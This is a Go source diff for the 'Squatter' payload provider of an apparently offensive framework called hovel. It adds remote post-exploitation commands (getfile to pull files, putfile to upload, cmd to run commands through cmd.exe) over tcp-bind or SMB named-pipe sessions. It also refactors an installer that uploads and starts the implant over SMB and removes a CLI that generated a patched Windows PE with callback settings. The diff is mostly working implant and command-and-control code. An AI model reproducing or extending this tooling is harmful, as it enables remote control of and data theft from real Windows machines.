@@ -5,6 +5,7 @@
 package main
 
 import (
+	"bufio"
 	"bytes"
 	"context"
 	"crypto/rand"
@@ -12,7 +13,6 @@ import (
 	"encoding/base64"
 	"encoding/binary"
 	"encoding/hex"
-	"flag"
 	"fmt"
 	"io"
 	"net"
@@ -25,6 +25,8 @@ import (
 
 	"github.com/Vibe-Pwners/hovel/payloads/squatter/client/shell"
 	"github.com/Vibe-Pwners/hovel/payloads/squatter/client/smbpipe"
+	"github.com/Vibe-Pwners/hovel/payloads/squatter/client/wire"
+	"github.com/Vibe-Pwners/hovel/payloads/squatter/client/xfer"
 	"github.com/Vibe-Pwners/hovel/sdk/go/hovel"
 )
 
@@ -56,30 +58,26 @@ const (
 
 // Provider implements Hovel's payload_provider contract for Squatter.
 type Provider struct {
-	lp           listeningPost
-	smbInstaller smbInstaller
+	lp         *placeholderLP
+	installSMB func(hovel.StepExecuteRequest, smbInstallOptions) (smbInstallResult, error)
 }
 
 func newProvider() Provider {
-	return Provider{lp: newPlaceholderLP(), smbInstaller: goSMBInstaller{}}
+	return Provider{lp: newPlaceholderLP(), installSMB: installSMB}
 }
 
-func (p Provider) listeningPost() listeningPost {
+func (p Provider) listeningPost() *placeholderLP {
 	if p.lp == nil {
 		return newPlaceholderLP()
 	}
 	return p.lp
 }
 
-func (p Provider) installer() smbInstaller {
-	if p.smbInstaller == nil {
-		return goSMBInstaller{}
+func (p Provider) install(req hovel.StepExecuteRequest, opts smbInstallOptions) (smbInstallResult, error) {
+	if p.installSMB == nil {
+		return installSMB(req, opts)
 	}
-	return p.smbInstaller
-}
-
-type smbInstaller interface {
-	InstallSMB(hovel.StepExecuteRequest, smbInstallOptions) (smbInstallResult, error)
+	return p.installSMB(req, opts)
 }
 
 type smbInstallOptions struct {
@@ -108,9 +106,7 @@ type smbInstallResult struct {
 	ATJobID       uint32
 }
 
-type goSMBInstaller struct{}
-
-func (goSMBInstaller) InstallSMB(_ hovel.StepExecuteRequest, opts smbInstallOptions) (smbInstallResult, error) {
+func installSMB(_ hovel.StepExecuteRequest, opts smbInstallOptions) (smbInstallResult, error) {
 	result, err := smbpipe.UploadAndStart(context.Background(), smbpipe.InstallOptions{
 		Options: smbpipe.Options{
 			Host:     opts.Host,
@@ -210,27 +206,23 @@ func (p Provider) Run(ctx *hovel.Context) (hovel.Result, error) {
 		hovel.WithSummary("Squatter session connected"),
 	)
 	if transport == tcpBind {
-		if placeholder, ok := lp.(*placeholderLP); ok {
-			if conn, ok := placeholder.tcpBindConn(target); ok {
-				ref, err := openSquatterSession(ctx, conn, "squatter/tcp-bind")
-				if err != nil {
-					return hovel.Result{}, err
-				}
-				result.Sessions = append(result.Sessions, ref)
-				return result, nil
+		if conn, ok := lp.tcpBindConn(target); ok {
+			ref, err := openSquatterSession(ctx, conn, "squatter/tcp-bind")
+			if err != nil {
+				return hovel.Result{}, err
 			}
+			result.Sessions = append(result.Sessions, ref)
+			return result, nil
 		}
 	}
 	if transport == smbNamedPipe {
-		if placeholder, ok := lp.(*placeholderLP); ok {
-			if conn, ok := placeholder.smbConn(target); ok {
-				ref, err := openSquatterSession(ctx, conn, "squatter/smb-named-pipe")
-				if err != nil {
-					return hovel.Result{}, err
-				}
-				result.Sessions = append(result.Sessions, ref)
-				return result, nil
+		if conn, ok := lp.smbConn(target); ok {
+			ref, err := openSquatterSession(ctx, conn, "squatter/smb-named-pipe")
+			if err != nil {
+				return hovel.Result{}, err
 			}
+			result.Sessions = append(result.Sessions, ref)
+			return result, nil
 		}
 	}
 	result.Sessions = append(result.Sessions, session)
@@ -783,7 +775,7 @@ func (p Provider) executeSMBInstall(req hovel.StepExecuteRequest) (hovel.StepExe
 	if err != nil {
 		return hovel.StepExecuteResult{}, err
 	}
-	install, err := p.installer().InstallSMB(req, installOpts)
+	install, err := p.install(req, installOpts)
 	if err != nil {
 		return hovel.StepExecuteResult{
 			Status: "install_failed",
@@ -1410,6 +1402,59 @@ func (p Provider) ConnectSession(req hovel.ConnectSessionRequest) (hovel.Session
 	return p.listeningPost().ConnectSession(req)
 }
 
+func (Provider) ListPayloadCommands(hovel.PayloadCommandListRequest) ([]hovel.PayloadCommand, error) {
+	return []hovel.PayloadCommand{
+		{
+			Name:         "getfile",
+			Summary:      "download a file from Squatter",
+			Usage:        "getfile <remote>",
+			ReadOnly:     true,
+			Capabilities: []string{"file.get"},
+			Arguments: []hovel.PayloadCommandArgument{
+				{Name: "remote", Help: "Remote path", Required: true},
+			},
+		},
+		{
+			Name:         "putfile",
+			Summary:      "upload a file to Squatter",
+			Usage:        "putfile <remote>",
+			Destructive:  true,
+			Capabilities: []string{"file.put"},
+			Arguments: []hovel.PayloadCommandArgument{
+				{Name: "remote", Help: "Remote path", Required: true},
+			},
+		},
+		{
+			Name:         "cmd",
+			Summary:      "run one command through cmd.exe",
+			Usage:        "cmd <command>",
+			Destructive:  true,
+			Capabilities: []string{"process.exec"},
+			Arguments: []hovel.PayloadCommandArgument{
+				{Name: "command", Help: "Command line", Required: true},
+			},
+		},
+	}, nil
+}
+
+func (p Provider) RunPayloadCommand(req hovel.PayloadCommandRequest) (hovel.PayloadCommandResult, error) {
+	conn, reader, err := p.payloadCommandConn(req)
+	if err != nil {
+		return hovel.PayloadCommandResult{}, err
+	}
+	defer conn.Close()
+	switch req.Command {
+	case "getfile":
+		return runGetfileCommand(conn, reader, req)
+	case "putfile":
+		return runPutfileCommand(conn, reader, req)
+	case "cmd":
+		return runCmdCommand(conn, reader, req)
+	default:
+		return hovel.PayloadCommandResult{}, fmt.Errorf("unsupported Squatter payload command %q", req.Command)
+	}
+}
+
 func (p Provider) CleanupPayload(req hovel.CleanupPayloadRequest) (hovel.CleanupResult, error) {
 	return p.listeningPost().Cleanup(req)
 }
@@ -1422,6 +1467,132 @@ func (Provider) ReadPayloadChunk(req hovel.ReadPayloadChunkRequest) (hovel.Paylo
 		EOF:      true,
 		Encoding: "base64",
 	}, nil
+}
+
+func (p Provider) payloadCommandConn(req hovel.PayloadCommandRequest) (io.ReadWriteCloser, *bufio.Reader, error) {
+	connectReq := requestWithReconnectRecord(hovel.ConnectSessionRequest{
+		Target:             req.Target,
+		PayloadID:          req.PayloadID,
+		InstalledPayloadID: req.InstalledPayloadID,
+		Config:             req.Config,
+		Reconnect:          req.Reconnect,
+		Agent:              req.Agent,
+	})
+	lp := p.listeningPost()
+	var conn io.ReadWriteCloser
+	var err error
+	switch canonicalTransport(connectReq.Config["payload.transport"]) {
+	case tcpBind:
+		conn, err = lp.connectTCPBind(connectReq)
+	case smbNamedPipe:
+		conn, err = lp.connectSMB(connectReq)
+	default:
+		err = fmt.Errorf("payload command transport %q is not supported", connectReq.Config["payload.transport"])
+	}
+	if err != nil {
+		return nil, nil, err
+	}
+	return conn, bufio.NewReader(conn), nil
+}
+
+func runGetfileCommand(conn io.Writer, reader *bufio.Reader, req hovel.PayloadCommandRequest) (hovel.PayloadCommandResult, error) {
+	if len(req.Args) < 1 || strings.TrimSpace(req.Args[0]) == "" {
+		return hovel.PayloadCommandResult{}, fmt.Errorf("getfile requires remote path")
+	}
+	remote := req.Args[0]
+	var data bytes.Buffer
+	n, err := xfer.GetFile(conn, reader, 1, remote, &data)
+	if err != nil {
+		return hovel.PayloadCommandResult{}, err
+	}
+	name := filepath.Base(strings.ReplaceAll(remote, "\\", "/"))
+	if name == "" || name == "." {
+		name = "squatter-download.bin"
+	}
+	return hovel.PayloadCommandResult{
+		Command: "getfile",
+		Summary: fmt.Sprintf("downloaded %d bytes from %s", n, remote),
+		Artifacts: []hovel.Artifact{
+			hovel.InlineArtifact(name, "application/octet-stream", data.String()),
+		},
+		Fields: map[string]string{"remote": remote, "bytes": strconv.FormatInt(n, 10)},
+	}, nil
+}
+
+func runPutfileCommand(conn io.Writer, reader *bufio.Reader, req hovel.PayloadCommandRequest) (hovel.PayloadCommandResult, error) {
+	if len(req.Args) < 1 || strings.TrimSpace(req.Args[0]) == "" {
+		return hovel.PayloadCommandResult{}, fmt.Errorf("putfile requires remote path")
+	}
+	remote := req.Args[0]
+	src, closeSrc, err := payloadCommandInput(req)
+	if err != nil {
+		return hovel.PayloadCommandResult{}, err
+	}
+	defer closeSrc()
+	sent, ack, err := xfer.PutFile(conn, reader, 1, src, remote)
+	if err != nil {
+		return hovel.PayloadCommandResult{}, err
+	}
+	return hovel.PayloadCommandResult{
+		Command: "putfile",
+		Summary: fmt.Sprintf("uploaded %d bytes to %s", sent, remote),
+		Stdout:  ack,
+		Fields:  map[string]string{"remote": remote, "bytes": strconv.FormatInt(sent, 10)},
+	}, nil
+}
+
+func payloadCommandInput(req hovel.PayloadCommandRequest) (io.Reader, func(), error) {
+	if req.InputPath != "" {
+		file, err := os.Open(req.InputPath)
+		if err != nil {
+			return nil, func() {}, err
+		}
+		return file, func() { _ = file.Close() }, nil
+	}
+	switch strings.ToLower(strings.TrimSpace(req.InputEncoding)) {
+	case "", "utf-8", "text":
+		return strings.NewReader(req.InputData), func() {}, nil
+	case "base64":
+		data, err := base64.StdEncoding.DecodeString(req.InputData)
+		if err != nil {
+			return nil, func() {}, err
+		}
+		return bytes.NewReader(data), func() {}, nil
+	default:
+		return nil, func() {}, fmt.Errorf("unsupported input encoding %q", req.InputEncoding)
+	}
+}
+
+func runCmdCommand(conn io.Writer, reader *bufio.Reader, req hovel.PayloadCommandRequest) (hovel.PayloadCommandResult, error) {
+	if len(req.Args) < 1 || strings.TrimSpace(req.Args[0]) == "" {
+		return hovel.PayloadCommandResult{}, fmt.Errorf("cmd requires command line")
+	}
+	if deadline, ok := conn.(interface{ SetDeadline(time.Time) error }); ok {
+		_ = deadline.SetDeadline(time.Now().Add(15 * time.Second))
+		defer deadline.SetDeadline(time.Time{})
+	}
+	command := req.Args[0]
+	if err := wire.WriteFrame(conn, wire.KindOpen, 1, wire.EncodeOpen("cmd", []string{command})); err != nil {
+		return hovel.PayloadCommandResult{}, err
+	}
+	var out bytes.Buffer
+	for {
+		kind, _, payload, err := wire.ReadFrame(reader)
+		if err != nil {
+			return hovel.PayloadCommandResult{}, err
+		}
+		switch kind {
+		case wire.KindClose:
+			return hovel.PayloadCommandResult{
+				Command: "cmd",
+				Summary: "command completed",
+				Stdout:  out.String(),
+				Fields:  map[string]string{"command": command},
+			}, nil
+		case wire.KindData:
+			_, _ = out.Write(payload)
+		}
+	}
 }
 
 func payloadInfo(transport string) hovel.PayloadInfo {
@@ -1474,57 +1645,4 @@ func capabilities() []string {
 		"process.tasklist",
 		"library.rundll",
 	}
-}
-
-func main() {
-	if len(os.Args) > 1 && os.Args[1] == "generate" {
-		os.Exit(runGenerateCommand(os.Args[2:], os.Stdout, os.Stderr))
-	}
-	hovel.Serve(newProvider())
-}
-
-func runGenerateCommand(args []string, stdout, stderr io.Writer) int {
-	flags := flag.NewFlagSet("squatter-provider generate", flag.ContinueOnError)
-	flags.SetOutput(stderr)
-	transport := flags.String("transport", tcpBind, "payload transport: tcp-bind, smb-named-pipe, or tcp-callback")
-	outPath := flags.String("out", "", "path to write the patched PE")
-	pipe := flags.String("pipe", `\\.\pipe\squatter`, "named pipe for smb-named-pipe transport")
-	bindPort := flags.String("bind-port", "9100", "TCP bind port")
-	lhost := flags.String("lhost", "127.0.0.1", "TCP callback host")
-	lport := flags.String("lport", "4444", "TCP callback port")
-	if err := flags.Parse(args); err != nil {
-		return 2
-	}
-	if *outPath == "" {
-		fmt.Fprintln(stderr, "generate requires --out")
-		return 2
-	}
-	config := map[string]string{
-		"payload.transport": canonicalTransport(*transport),
-		"payload.pipe":      *pipe,
-		"payload.bind_port": *bindPort,
-		"payload.lhost":     *lhost,
-		"payload.lport":     *lport,
-	}
-	artifact, err := newProvider().GeneratePayload(hovel.GeneratePayloadRequest{
-		RunID:     "manual-generate",
-		PayloadID: "squatter/windows/x86/windows-7/" + config["payload.transport"] + "/pe-exe",
-		Format:    formatPEEXE,
-		Config:    config,
-	})
-	if err != nil {
-		fmt.Fprintf(stderr, "generate: %v\n", err)
-		return 1
-	}
-	body, err := base64.StdEncoding.DecodeString(artifact.Primary.Bytes)
-	if err != nil {
-		fmt.Fprintf(stderr, "decode generated payload: %v\n", err)
-		return 1
-	}
-	if err := os.WriteFile(*outPath, body, 0600); err != nil {
-		fmt.Fprintf(stderr, "write %s: %v\n", *outPath, err)
-		return 1
-	}
-	fmt.Fprintf(stdout, "wrote %s (%d bytes, transport=%s)\n", *outPath, len(body), config["payload.transport"])
-	return 0
 }
